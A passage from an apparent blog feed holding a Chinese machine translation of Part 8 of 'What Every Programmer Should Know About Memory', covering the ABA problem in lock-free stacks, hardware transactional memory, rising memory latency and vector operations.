href="http://en.wikipedia.org/wiki/Static_Random_Access_Memory">http://en.wikipedia.org/wiki/Static_Random_Access_Memory</a>, 2006.</li><li>[transactmem]<br>Herlihy, Maurice and J. Eliot B. Moss. Transactional memory: Architectural support for lock-free data structures. Proceedings of 20th international symposium on computer architecture. 1993.</li><li>[vectorops]<br>Gebis, Joe and David Patterson. Embracing and Extending 20th-Century Instruction Set Architectures. Computer, 40(4):68–75, 2007.</li></ul><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://lwn.net/Articles/258188/">原文</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>内存</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>每一个程序员都应该了解的内存知识-Part8</title>
    <link href="/2024/04/29/%E6%AF%8F%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%91%98%E9%83%BD%E5%BA%94%E8%AF%A5%E4%BA%86%E8%A7%A3%E7%9A%84%E5%86%85%E5%AD%98%E7%9F%A5%E8%AF%86-Part8/"/>
    <url>/2024/04/29/%E6%AF%8F%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%91%98%E9%83%BD%E5%BA%94%E8%AF%A5%E4%BA%86%E8%A7%A3%E7%9A%84%E5%86%85%E5%AD%98%E7%9F%A5%E8%AF%86-Part8/</url>
    
    <content type="html"><![CDATA[<p>未来技术</p><span id="more"></span><p><strong>注：本文由 <code>Kimi AI</code> 翻译</strong></p><h2 id="8-即将到来的技术"><a href="#8-即将到来的技术" class="headerlink" title="8 即将到来的技术"></a>8 即将到来的技术</h2><p>在前面关于多处理器处理的部分，我们已经看到，如果 CPU 或核心的数量增加，可能会出现显著的性能问题。但这正是未来所期望的。处理器将拥有越来越多的核心，程序必须越来越并行化，以利用 CPU 增加的潜力，因为单核性能的提高速度将不会像过去那样快。</p><h3 id="8-1-原子操作的问题"><a href="#8-1-原子操作的问题" class="headerlink" title="8.1 原子操作的问题"></a>8.1 原子操作的问题</h3><p>传统上，同步对共享数据结构的访问有两种方式：</p><ul><li>通过互斥，通常使用系统运行时的功能来实现；</li><li>通过使用无锁数据结构。</li></ul><p>无锁数据结构的问题在于，处理器必须提供可以原子执行整个操作的原语。这种支持是有限的。在大多数架构上，支持仅限于原子地读取和写入一个字。实现这一点有两种基本方式（见第 6.4.2 节）：</p><ul><li>使用原子比较和交换（CAS）操作；</li><li>使用加载锁定&#x2F;存储条件（LL&#x2F;SC）对。</li></ul><p>可以很容易地看出如何使用 LL&#x2F;SC 指令实现 CAS 操作。这使得 CAS 操作成为大多数原子操作和无锁数据结构的构建块。</p><p>一些处理器，特别是 x86 和 x86-64 架构，提供了更精细的原子操作集。它们中的许多是针对特定目的的 CAS 操作的优化。例如，原子地将一个值添加到内存位置可以使用 CAS 和 LL&#x2F;SC 操作实现，但 x86&#x2F;x86-64 处理器对原子增量的原生支持更快。程序员需要知道这些操作，以及编程时可用的内建函数，但这并不是什么新鲜事。</p><p>这两个架构的非凡扩展是它们具有双字 CAS（DCAS）操作。这对于某些应用程序很重要，但并非全部（见 [dcas]）。作为 DCAS 如何使用的示例，让我们尝试编写一个基于锁自由数组的栈&#x2F;LIFO 数据结构。使用 gcc 的内建函数的第一次尝试可以在图 8.1 中看到。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292203221.png"><br>图 8.1：非线程安全的 LIFO</p><p>这段代码显然不是线程安全的。不同线程中的并发访问将修改全局变量 <code>top</code>，而不考虑其他线程的修改。可能会丢失元素，或者删除的元素可能会神奇地重新出现。可以使用互斥，但这里我们只尝试使用原子操作。</p><p>修复问题的第一次尝试是在安装或删除列表元素时使用 CAS 操作。生成的代码看起来像图 8.2。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292204721.png"><br>图 8.2：使用 CAS 的 LIFO</p><p>乍一看，这看起来像是一个可行的解决方案。<code>top</code> 只有在与 LIFO 顶部的元素匹配时才永远不会被修改。但我们必须考虑所有级别的并发。可能会在最糟糕的时刻调度另一个线程来处理数据结构。这里一个这样的情况是所谓的 ABA 问题。考虑一下，如果第二个线程在 <code>pop</code> 中的 CAS 操作之前被调度，并执行以下操作：</p><ol><li><code>l = pop()</code></li><li><code>push(newelem)</code></li><li><code>push(l)</code></li></ol><p>这一系列操作的最终效果是，LIFO 的前一个顶部元素回到了顶部，但第二个元素是不同的。回到第一个线程，因为顶部元素没有改变，CAS 操作将成功。但 <code>res-&gt;c</code> 的值不是正确的值。它是指向原始 LIFO 的第二个元素的指针，而不是 <code>newelem</code>。结果是这个新元素丢失了。</p><p>在文献 [lockfree] 中，你可以找到使用一些处理器上发现的特性来解决这个问题的建议。具体来说，这是关于 x86 和 x86-64 处理器执行 DCAS 操作的能力。这在图 8.3 中代码的第三个版本中使用。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292204402.png"><br>图 8.3：使用双字 CAS 的 LIFO</p><p>与其他两个示例不同，这是（目前）伪代码，因为 gcc 不理解 CAS 内建函数中结构的使用。无论如何，示例应该足够理解方法。在 LIFO 顶部的指针上添加了一个代数计数器。由于它在每次操作中都被更改，<code>push</code> 或 <code>pop</code>，上述描述的 ABA 问题不再是问题。当第一个线程通过实际交换 <code>top</code> 指针来恢复其工作时，代数计数器已经增加了三次。CAS 操作将失败，在循环的下一轮中，确定 LIFO 的正确第一个和第二个元素，并且 LIFO 不会被破坏。瞧。</p><p>这真的是解决方案吗？[lockfree] 的作者们肯定让它听起来像是，而且，值得赞扬的是，应该提到，可以构建数据结构以允许使用上述代码。但是，一般来说，这种方法和前一种方法一样注定要失败。我们仍然有并发问题，只是在不同的地方。假设一个线程执行 <code>pop</code> 并在测试 <code>old.top == NULL</code> 后被中断。现在，第二个线程使用 <code>pop</code> 并获得 LIFO 的前一个第一个元素的所有权。它可以对它做任何事情，包括更改所有值，或者在动态分配的元素的情况下，释放内存。</p><p>现在，第一个线程恢复。<code>old</code> 变量仍然填充了 LIFO 的前一个顶部。更具体地说，<code>top</code> 成员指向第二个线程弹出的元素。在 <code>new.top = old.top-&gt;c</code> 中，第一个线程解引用了元素中的指针。但是，这个指针引用的元素可能已经被释放。该地址空间的部分可能无法访问，进程可能会崩溃。这不能被允许用于通用数据类型实现。任何对这个问题的修复都是极其昂贵的：内存永远不能被释放，或者至少在释放内存之前必须验证没有线程正在引用内存。鉴于无锁数据结构应该更快、更并发，这些额外的要求完全破坏了任何优势。在支持它的语言中，通过垃圾回收处理内存可以解决问题，但这也有其代价。</p><p>对于更复杂的数据结构，情况通常更糟。上述论文还描述了一个 FIFO 实现（在后续论文中有改进）。但这段代码有所有相同的问题。因为现有的硬件（x86、x86-64）上的 CAS 操作仅限于修改内存中连续的两个单词，它们在其他常见情况下根本没有帮助。例如，原子地在双向链表中的任何位置添加或删除元素是不可能的。{ _作为边注，IA-64 的开发人员没有包括这个功能。他们允许比较两个单词，但只替换一个。}</p><p>问题是通常涉及一个以上的内存地址，只有当这些地址的值同时没有被并发更改时，整个操作才能成功。这是数据库处理中众所周知的概念，这正是解决这一困境最有希望的提议之一的来源。</p><h3 id="8-2-事务内存"><a href="#8-2-事务内存" class="headerlink" title="8.2 事务内存"></a>8.2 事务内存</h3><p>在他们开创性的 1993 年论文 [transactmem] 中，Herlihy 和 Moss 提出在硬件中实现内存操作的事务，因为软件本身无法有效处理这个问题。当时，Digital Equipment Corporation 已经在他们的高端硬件上与可扩展性问题作斗争，这些硬件配备了几十个处理器。该原理与数据库事务相同：事务的结果要么一次性全部可见，要么事务被中止，所有值保持不变。</p><p>这是内存发挥作用的地方，也是为什么上一节费心开发使用原子操作的算法的原因。事务内存旨在在许多情况下替代并扩展原子操作，特别是对于无锁数据结构。将事务系统集成到处理器中听起来是一件非常复杂的事情，但实际上，大多数处理器已经在某种程度上拥有了一些类似的东西。</p><p>一些处理器实现的 LL&#x2F;SC 操作形成了一个事务。SC 指令根据内存位置是否被触碰来中止或提交事务。事务内存是这个概念的扩展。现在，不仅仅是一个简单的指令对，多个指令参与到事务中。为了理解这是如何工作的，首先看看如何实现 LL&#x2F;SC 指令是值得的。{ _这并不意味着它实际上是这样实现的。}</p><p><strong>8.2.1 加载锁定&#x2F;存储条件实现</strong></p><p>如果发出 LL 指令，内存位置的值将被加载到寄存器中。作为该操作的一部分，该值被加载到 L1d 中。SC 指令后来只有在该值没有被篡改时才能成功。处理器如何检测到这一点？回顾一下图 3.18 中 MESI 协议的描述，应该可以明显看出答案。如果另一个处理器更改了内存位置的值，第一个处理器 L1d 中的值副本必须被撤销。当 SC 指令在第一个处理器上执行时，它将发现它必须再次将该值加载到 L1d 中。这是处理器必须已经检测到的。</p><p>还有一些细节需要解决，关于上下文切换（在同一处理器上可能的修改）和意外地在另一个处理器上写入后重新加载缓存行。这不是策略（上下文切换时的缓存冲洗）和额外的标志，或 LL&#x2F;SC 指令的单独缓存行所不能解决的。总的来说，LL&#x2F;SC 实现几乎免费地随着像 MESI 这样的缓存一致性协议的实现而实现。</p><p><strong>8.2.2 事务内存操作</strong></p><p>为了使事务内存普遍有用，事务不能在第一个存储指令后就完成。相反，实现应该允许一定数量的加载和存储操作；这意味着我们需要单独的提交和中止指令。一会儿我们将看到，我们还需要一个更多的指令，允许检查当前事务的状态，以及它是否已经被中止或不是。</p><p>我们需要实现三种不同的内存操作：</p><ul><li>读取内存</li><li>读取稍后将被写入的内存</li><li>写入内存</li></ul><p>在查看 MESI 协议时，应该清楚这种特殊的第二种类型的读取操作如何有用。正常的读取可以由处于 ‘E’ 和 ‘S’ 状态的缓存行满足。第二种类型的读取操作需要处于 ‘E’ 状态的缓存行。为什么需要第二种类型的内存读取，可以从以下讨论中窥见一斑，但对于更完整的描述，感兴趣的读者应参考有关事务内存的文献，从 [transactmem] 开始。</p><p>此外，我们需要事务处理，主要由我们已经熟悉的提交和中止操作组成。然而，还有另一个操作，理论上是可选的，但对于使用事务内存编写健壮程序是必需的。这条指令允许线程测试事务是否仍然在正确的轨道上，并且是否可以稍后提交，或者事务是否已经失败，无论如何都将被中止。</p><p>在我们讨论这些操作实际上是如何与 CPU 缓存和总线操作交互之前，让我们先看看一些使用事务内存的实际代码。这将有助于理解本节的其余部分。</p><p><strong>8.2.3 使用事务内存的示例代码</strong></p><p>对于示例，我们再次回顾我们的运行示例，并显示一个使用事务内存实现的 LIFO。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292204905.png"><br>图 8.4：使用事务内存的 LIFO</p><p>这段代码看起来与非线程安全的代码非常相似，这是一个额外的好处，因为它使得使用事务内存编写代码更容易。代码的新部分是 <code>LTX</code>、<code>ST</code>、<code>COMMIT</code> 和 <code>VALIDATE</code> 操作。这四个操作是请求访问事务内存的方式。实际上还有一个更多的操作 <code>LT</code>，这里没有使用。<code>LT</code> 请求非排他性读取访问，<code>LTX</code> 请求排他性读取访问，<code>ST</code> 是将数据存储到事务内存中。<code>VALIDATE</code> 操作是检查事务是否仍在提交轨道上的操作。如果此事务仍然可以，它返回 true。如果事务已经被标记为中止，它将被实际中止，并且下一个事务内存指令将开始一个新的事务。因此，代码在事务仍在进行的情况下使用一个新的 <code>if</code> 块。</p><p><code>COMMIT</code> 操作完成事务；如果事务成功完成，该操作返回 true。这意味着程序的这部分已经完成，线程可以继续前进。如果操作返回 false 值，这通常意味着整个代码序列必须重复。这里外层的 <code>while</code> 循环正在执行这个操作。然而，这并不是绝对必要的，在某些情况下放弃工作是正确的做法。</p><p>关于 <code>LT</code>、<code>LTX</code> 和 <code>ST</code> 操作的有趣之处在于，它们可能会失败，但不会以任何直接的方式发出失败信号。程序可以通过 <code>VALIDATE</code> 或 <code>COMMIT</code> 操作请求此信息。对于加载操作，这可能意味着实际上加载到寄存器中的值可能是无效的；这就是为什么在上面的示例中，在解引用指针之前使用 <code>VALIDATE</code> 是一个明智的选择。在下一节中，我们将看到为什么这是实现的一个明智选择。一旦事务内存实际上广泛可用，处理器可能会实现不同的东西。[transactmem] 的结果表明了我们在这里描述的内容。</p><p><code>push</code> 函数可以总结如下：通过读取指向列表头部的指针来开始事务。读取请求排他性所有权，因为稍后在函数中这个变量将被写入。如果另一个线程已经启动了一个事务，加载将失败，并将尚未出生的事务标记为中止；在这种情况下，实际加载的值可能是垃圾。这个值，不管其状态如何，都存储在新列表成员的 <code>next</code> 字段中。这是可以的，因为此成员尚未使用，并且由一个线程访问。然后，将指向列表头部的指针分配给指向新元素的指针。如果事务仍然可以，这个写入可以成功。这是正常情况，只有在一个线程使用一些除提供的 <code>push</code> 和 <code>pop</code> 函数之外的代码来访问此指针时才会失败。</p><p>如果事务在执行 <code>ST</code> 时已经被中止，就什么都不做。最后，线程尝试提交事务。如果成功，工作就完成了；其他线程现在可以开始它们的事务。如果事务失败，必须从一开始就重复。然而，在这样做之前，最好插入一个延迟。如果这样做，线程可能会在一个忙循环中运行（浪费能源，使 CPU 过热）。</p><p><code>pop</code> 函数稍微复杂一些。它也以读取包含列表头部的变量开始，请求排他性所有权。然后，代码立即检查 <code>LTX</code> 操作是否成功。如果没有，这一轮除了延迟下一轮之外什么也不做。如果 <code>top</code> 指针成功读取，这意味着其状态良好；我们现在可以解引用指针。记住，这正是使用原子操作的代码的问题；使用事务内存，这种情况可以毫无问题地处理。接下来的 <code>ST</code> 操作只在 LIFO 不为空时执行，就像原始的非线程安全代码一样。最后，事务被提交。如果成功，函数返回旧的指向头部的指针；否则，我们延迟并重试。这段代码的一个棘手的部分是要记住 <code>VALIDATE</code> 操作如果事务已经失败，则会中止事务。下一个事务内存操作将开始一个新的事务，因此我们必须跳过函数中剩余的代码。</p><p>延迟代码的工作方式将是我们看到事务内存在硬件中实现时的一件事。如果做得不好，系统性能可能会受到显著影响。</p><p><strong>8.2.4 事务内存的总线协议</strong></p><p>现在我们已经看到了事务内存背后的基本原理，我们可以深入到实现细节中。请注意，这不是基于实际硬件。它基于事务内存的原始设计和对缓存一致性协议的了解。一些细节被省略了，但它仍然应该能够让人洞察性能特性。</p><p>事务内存实际上并不是作为单独的内存实现的；这没有任何意义，因为任何位置的线程地址空间都想要事务。相反，它在第一级缓存中实现。实现理论上可以发生在正常的 L1d 中，但正如 [transactmem] 所指出的，这不是一个好主意。我们更有可能看到事务缓存在 L1d 旁边实现。所有访问将以与 L1d 相同的方式使用更高级别的缓存。事务缓存可能比 L1d 小得多。如果它是全关联的，其大小由事务可以包含的操作数量决定。实现可能会对架构和&#x2F;或特定处理器版本有限制。可以很容易地想象一个具有 16 个元素甚至更少的事务缓存。在上面的示例中，我们只需要一个单一的内存位置；具有更大事务工作集的算法变得非常复杂。可能会看到支持同时活跃多个事务的处理器。缓存中的元素数量然后乘以，但它仍然足够小，可以全关联。</p><p>事务缓存和 L1d 是排他性的。这意味着缓存行最多在一个缓存中，而不是同时在两个缓存中。事务缓存中的每个插槽在任何时候都处于四种 MESI 协议状态之一。除此之外，插槽还有一个事务状态。状态如下（名称根据 [transactmem]）：</p><p><strong>EMPTY</strong> 缓存插槽不包含数据。MESI 状态总是 ‘I’。<br><br><strong>NORMAL</strong> 缓存插槽包含已提交的数据。数据也可以存在于 L1d 中。MESI 状态可以是 ‘M’、’E’ 和 ‘S’。允许 ‘M’ 状态的事实意味着事务提交不会强制将数据写入主内存（除非内存区域被声明为未缓存或写通）。这可以显著提高性能。<br><br><strong>XABORT</strong> 缓存插槽包含在中止时丢弃的数据。这显然是 XCOMMIT 的相反。所有在事务期间创建的数据都保留在事务缓存中，在提交之前不会写入主内存。这限制了最大事务大小，但这意味着，除了事务缓存之外，没有其他内存需要了解单个内存位置的 XCOMMIT&#x2F;XABORT 二元性。<br><br><strong>XCOMMIT</strong> 缓存插槽包含在提交时丢弃的数据。这是处理器可以实现的可能的优化。如果使用事务操作更改内存位置，不能只是丢弃旧内容：如果事务失败，则需要恢复旧内容。MESI 状态与 XABORT 相同。与 XABORT 的一个区别是，如果事务缓存已满，任何处于 ‘M’ 状态的 XCOMMIT 条目都可以写回内存，然后对于所有状态，都被丢弃。<br></p><p>当 <code>LT</code> 操作开始时，处理器在缓存中分配两个插槽。首先寻找操作地址的正常插槽，即缓存命中。如果找到这样的条目，找到第二个插槽，复制值，一个条目被标记为 XABORT，另一个被标记为 XCOMMIT。</p><p>如果地址尚未缓存在 EMPTY 缓存插槽中。如果没有找到 EMPTY 插槽，寻找 NORMAL 插槽。如果 MESI 状态是 ‘M’，则必须将旧内容刷新到内存中。如果没有找到 NORMAL 插槽，可能会牺牲 XCOMMIT 条目。这很可能是一个实现细节。事务的最大大小由事务缓存的大小决定，并且由于每个事务中的每个操作所需的插槽数量是固定的，因此在必须驱逐 XCOMMIT 条目之前，可以限制事务的数量。</p><p>如果事务缓存中找不到地址，总线上会发出 T_READ 请求。这就像正常的 READ 总线请求，但它表明这是为了事务缓存。就像正常的 READ 请求一样，所有其他处理器的缓存首先有机会响应。如果没有响应，值从主内存中读取。MESI 协议决定新缓存行的状态是 ‘E’ 还是 ‘S’。T_READ 和 READ 之间的差异在于，当缓存行当前由另一个处理器或核心上的活动事务使用时。在这种情况下，T_READ 操作简单地失败，不传输数据。生成 T_READ 总线请求的事务被标记为失败，并且在操作中使用的值（通常是简单的寄存器加载）是未定义的。回顾示例，我们可以看到，如果正确使用事务内存操作，这种行为不会引起问题。在事务中加载的值被使用之前，必须通过 <code>VALIDATE</code> 进行验证。这几乎不会增加额外的负担。正如我们在尝试使用原子操作创建 FIFO 实现时所看到的，我们添加的检查是使无锁代码工作所缺少的功能。</p><p><code>LTX</code> 操作与 <code>LT</code> 几乎相同。唯一的区别是总线操作是 T_RFO 而不是 T_READ。T_RFO 像正常的 RFO 总线请求一样，请求缓存行的排他性所有权。结果的缓存行状态是 ‘E’。像 T_READ 总线请求一样，T_RFO 也可能失败，在这种情况下，使用的值也是未定义的。如果缓存行已经在本地事务缓存中处于 ‘M’ 或 ‘E’ 状态，则无需执行任何操作。如果本地事务缓存中的状态是 ‘S’，则必须发出总线请求以使所有其他副本失效。</p><p><code>ST</code> 操作与 <code>LTX</code> 类似。值首先在本地事务缓存中独家提供。然后，<code>ST</code> 操作在缓存中的第二个插槽中制作该值的副本，并将条目标记为 XCOMMIT。最后，另一个插槽被标记为 XABORT，新值被写入其中。如果事务已经被中止，或者由于隐式的 <code>LTX</code> 失败而新建中止，什么都不会被写入。</p><p><code>VALIDATE</code> 和 <code>COMMIT</code> 操作都不会自动和隐式地创建总线操作。这是事务内存相对于原子操作的巨大优势。使用原子操作，通过将更改的值写回主内存来实现并发。如果你已经阅读了本文到目前为止，你应该知道这是多么昂贵。使用事务内存，不会强制访问主内存。如果缓存没有 EMPTY 插槽，当前内容必须被驱逐，对于处于 ‘M’ 状态的插槽，内容必须被写回主内存。这与常规缓存没有什么不同，并且回写可以在没有特殊的原子性保证的情况下执行。如果缓存大小足够，内容可以存活很长时间。如果对同一内存位置重复执行事务，性能提升可能是惊人的，因为在一种情况下，我们每一轮都有一到两次主内存访问，而对于事务内存，所有访问都命中事务缓存，这和 L1d 一样快。</p><p>所有 <code>VALIDATE</code> 和 <code>COMMIT</code> 操作对已中止的事务所做的就是将标记为 XABORT 的缓存插槽标记为空，并将 XCOMMIT 插槽标记为 NORMAL。类似地，当 <code>COMMIT</code> 成功完成事务时，XCOMMIT 插槽被标记为空，XABORT 插槽被标记为 NORMAL。这些是对事务缓存的非常快速的操作。没有向其他处理器发出显式通知，这些处理器想要执行事务；那些处理器只需要继续尝试。有效地做到这一点是另一个问题。在上面的示例代码中，我们在适当的地方简单地有 <code>...delay...</code>。我们可能会看到实际的处理器支持以有用的方式延迟。</p><p>总结一下，事务内存操作只在启动新事务时和向仍然成功的事务添加尚未在事务缓存中的新缓存行时才会引起总线操作。已中止的事务的操作不会引起总线操作。不会由于多个线程尝试使用相同的内存而导致缓存行乒乓。 </p><p><strong>8.2.5 其他考虑</strong></p><p>在第 6.4.2 节中，我们已经讨论了如何在某些情况下使用 x86 和 x86-64 上可用的 <code>lock</code> 前缀来避免编写原子操作。然而，所提出的技巧在有多个线程使用时会失败，这些线程不争夺相同的内存。在这种情况下，原子操作被不必要地使用。有了事务内存，这个问题就消失了。昂贵的 RFO 总线请求只在内存在不同 CPU 上同时或连续使用时发出；这只在需要时出现。几乎不可能做得更好。</p><p>细心的读者可能会对延迟感到好奇。最坏的情况是什么？如果拥有活动事务的线程被调度出去，或者它接收到信号并且可能被终止，或者决定使用 <code>siglongjmp</code> 跳转到外层范围怎么办？答案是：事务将被中止。每当线程进行系统调用或接收到信号时（即，发生环级变化），都可以中止事务。当执行系统调用或处理信号时，中止事务也可能是操作系统职责的一部分。我们必须等待实现变得可用，以了解实际做了什么。</p><p>这里应该讨论的事务内存的最后一个方面是人们甚至今天可能想要考虑的事情。事务缓存和其他缓存一样，操作缓存行。由于事务缓存是排他性缓存，使用相同的缓存行进行事务和非事务操作将是一个问题。因此，重要的是：</p><ul><li>将非事务数据从缓存行移开</li><li>为在单独事务中使用的数据保留单独的缓存行</li></ul><p>第一点并不新鲜，今天原子操作的努力也会得到回报。第二点更成问题，因为今天的物体几乎不会对齐到缓存行，因为相关成本很高。如果使用原子操作修改的数据与数据在同一缓存行上，那么就需要一个更少的缓存行。这并不适用于互斥（其中互斥对象应该总是有自己的缓存行），但肯定可以找到原子操作与其他数据结合的案例。有了事务内存，将缓存行用于两个目的可能最有可能是致命的。对数据的每个正常访问 { _从相关缓存行。对任意其他缓存行的访问不会影响事务。} 将从事务缓存中移除缓存行，在此过程中中止事务。数据对象的缓存对齐在未来不仅是性能问题，也是正确性问题。</p><p>可能事务内存实现将使用更精确的会计，并且因此不会受到对作为事务一部分的缓存行上的数据进行正常访问的影响。这需要更多的努力，因为 MESI 协议信息不再足够。</p><h3 id="8-3-增加延迟"><a href="#8-3-增加延迟" class="headerlink" title="8.3 增加延迟"></a>8.3 增加延迟</h3><p>关于内存技术未来发展的一件事几乎可以肯定：延迟将继续上升。我们已经在第 2.2.4 节中讨论过，即将到来的 DDR3 内存技术将比当前的 DDR2 技术具有更高的延迟。如果 FB-DRAM 部署，它也可能具有更高的延迟，特别是当 FB-DRAM 模块串联时。传递请求和结果并不免费。</p><p>延迟的第二个来源是 NUMA 的日益增加的使用。AMD 的 Opterons 如果它们有超过一个处理器，就是 NUMA 机器。有一些本地内存连接到具有自己的内存控制器的 CPU，但在 SMP 主板上，其余的内存必须通过 Hypertransport 总线访问。由于每个处理器的带宽限制和要求保持（例如）多个 10Gb&#x2F;s 以太网端口忙碌，多插座主板不会消失，即使每个插座的核心数量增加。</p><p>延迟的第三个来源是协处理器。我们认为在 1990 年代初，商品处理器的数学协处理器不再必要后，我们已经摆脱了它们，但它们正在卷土重来。Intel 的 Geneseo 和 AMD 的 Torrenza 是平台的扩展，允许第三方硬件开发商将他们的产品集成到主板中。也就是说，协处理器不必坐在 PCIe 卡上，而是更接近 CPU 的位置。这为他们提供了更多的带宽。</p><p>IBM 通过 Cell CPU 采取了不同的路线（尽管仍然可以扩展 Intel 和 AMD 的功能）。Cell CPU 除了 PowerPC 核心外，还包括 8 个协同处理单元（SPUs），这些主要是用于浮点计算的专用处理器。</p><p>协处理器和 SPUs 的共同点是，它们很可能具有比真实处理器更慢的内存逻辑。这在一定程度上是由于必要的简化：所有的缓存处理、预取等都很复杂，特别是当也需要缓存一致性时。高性能程序将越来越多地依赖于协处理器，因为性能差异可能是戏剧性的。Cell CPU 的理论峰值性能为 210 GFLOPS，而高端 CPU 为 50-60 GFLOPS。今天使用的图形处理单元（GPU，显卡上的处理器）甚至达到了更高的数字（超过 500 GFLOPS），这些可能不需要太多努力就能集成到 Geneseo&#x2F;Torrenza 系统中。</p><p>由于所有这些发展，程序员必须得出结论，预取将变得越来越重要。对于协处理器，它将绝对至关重要。对于 CPU，特别是随着越来越多的核心，有必要始终让 FSB 保持忙碌，而不是批量堆积请求。这需要通过有效使用预取指令，尽可能多地让 CPU 了解未来的流量。</p><h3 id="8-4-向量操作"><a href="#8-4-向量操作" class="headerlink" title="8.4 向量操作"></a>8.4 向量操作</h3><p>当今主流处理器中的多媒体扩展仅以有限的方式实现向量操作。向量指令的特点是一起执行大量操作。与标量操作相比，可以这样评价多媒体指令，但与像 Cray-1 或 IBM 3090 这样的机器的向量计算机或向量单元相去甚远。</p><p>为了补偿每条指令执行的操作数量有限（在大多数机器上是四个 <code>float</code> 或两个 <code>double</code> 操作），必须更频繁地执行周围的循环。第 9.1 节中的示例清楚地显示了这一点，每个缓存行需要 <code>SM</code> 次迭代。</p><p>有了更宽的向量寄存器和操作，可以减少循环迭代次数。这不仅仅是改进了指令解码等；我们更感兴趣的是内存效应。通过单条指令加载或存储更多数据，处理器对应用程序的内存使用有了更好的了解，不必尝试从单个指令的行为中拼凑信息。此外，提供不影响缓存的加载或存储指令变得更加有用。在 x86 CPU 中，使用 16 字节宽的 SSE 寄存器加载，使用非缓存加载是一个坏主意，因为后来对同一缓存行的访问必须再次从内存中加载数据（在缓存未命中的情况下）。另一方面，如果向量寄存器足够宽以容纳一个或多个缓存行，非缓存加载或存储就不会产生负面影响。对不适合缓存的数据集执行操作变得更加实用。</p><p>拥有大的向量寄存器并不一定意味着指令的延迟会增加；向量指令不必等到所有数据都被读取或存储。向量单元可以在已经读取的数据上开始，如果它能够识别代码流。这意味着，例如，如果要加载向量寄存器，然后乘以标量，CPU 可以在向量的第一部分加载后立即开始乘法操作。这只是一个向量单元的复杂性问题。</p><p>从理论上讲，向量寄存器可以变得非常宽，程序也可以潜在地这样设计。在实践中，由于处理器在多进程和多线程操作系统中使用，向量寄存器大小受到限制。因此，上下文切换时间（包括存储和加载寄存器值）是重要的。</p><p>有了更宽的向量寄存器，就存在操作的输入和输出数据不能在内存中顺序布局的问题。这可能是因为矩阵是稀疏的，矩阵是按列而不是按行访问的，还有很多其他因素。向量单元为此提供了访问非顺序模式内存的方法。单个向量加载或存储可以参数化，并指示从地址空间中的许多不同位置加载数据。使用今天的多媒体指令，这根本不可能。值必须逐个显式加载，然后费心地组合成一个向量寄存器。</p><p>旧日的向量单元有不同的模式允许最有用访问模式：</p><ul><li>使用 _步进_，程序可以指定两个相邻向量元素之间的间隙有多大。所有元素之间的间隙必须相同，但这将很容易地允许在一条指令中将矩阵的一列读入向量寄存器，而不是每行一条指令。</li><li>使用间接，可以创建任意访问模式。加载或存储指令将接收一个指向数组的指针，该数组包含要加载的实际内存位置的地址或偏移量。</li></ul><p>目前尚不清楚我们是否会在未来的主流处理器版本中看到真正的向量操作的复兴。也许这项工作将被归属于协处理器。无论如何，如果我们能够获得向量操作的访问权限，正确组织执行此类操作的代码就更加重要。代码应该是自包含的和可替换的，接口应该足够通用，以便有效地应用向量操作。例如，接口应该允许添加整个矩阵而不是操作行、列或甚至元素组。构建块越大，使用向量操作的机会就越好。</p><p>在 [vectorops] 中，作者为向量操作的复兴提出了热情的呼吁。他们指出了许多优点，并试图揭穿各种神话。然而，他们描绘了一个过于简单化的形象。如上所述，大型寄存器集意味着高上下文切换时间，这在通用操作系统中必须避免。看看 IA-64 处理器在涉及上下文切换密集型操作时的问题。向量操作的长时间执行也是一个问题，如果涉及中断。如果引发中断，处理器必须停止当前工作并开始处理中断。之后，它必须恢复执行被中断的代码。中断工作中间的指令通常是一个大问题；这并非不可能，但很复杂。对于长时间运行的指令，必须这样做，或者指令必须以可重启的方式实现，否则中断响应时间太长。后者是不可接受的。</p><p>向量单元在内存访问对齐方面也相对宽容，这影响了开发的算法。一些今天的处理器（特别是 RISC 处理器）要求严格的对齐，因此扩展到完整的向量操作并不平凡。拥有向量操作有很大的潜在好处，特别是当支持步进和间接时，因此我们可以期待在未来看到这个功能。</p><h2 id="附录和参考文献"><a href="#附录和参考文献" class="headerlink" title="附录和参考文献"></a>附录和参考文献</h2><p>附录和参考文献页面包含了许多基准测试程序的源代码、有关 oprofile 的更多信息、对内存类型的一些讨论、对 libNUMA 的介绍以及参考文献。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://lwn.net/Articles/258154/">原文</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>内存</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>每一个程序员都应该了解的内存知识-Part7</title>
    <link href="/2024/04/29/%E6%AF%8F%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%91%98%E9%83%BD%E5%BA%94%E8%AF%A5%E4%BA%86%E8%A7%A3%E7%9A%84%E5%86%85%E5%AD%98%E7%9F%A5%E8%AF%86-Part7/"/>
    <url>/2024/04/29/%E6%AF%8F%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%91%98%E9%83%BD%E5%BA%94%E8%AF%A5%E4%BA%86%E8%A7%A3%E7%9A%84%E5%86%85%E5%AD%98%E7%9F%A5%E8%AF%86-Part7/</url>
    
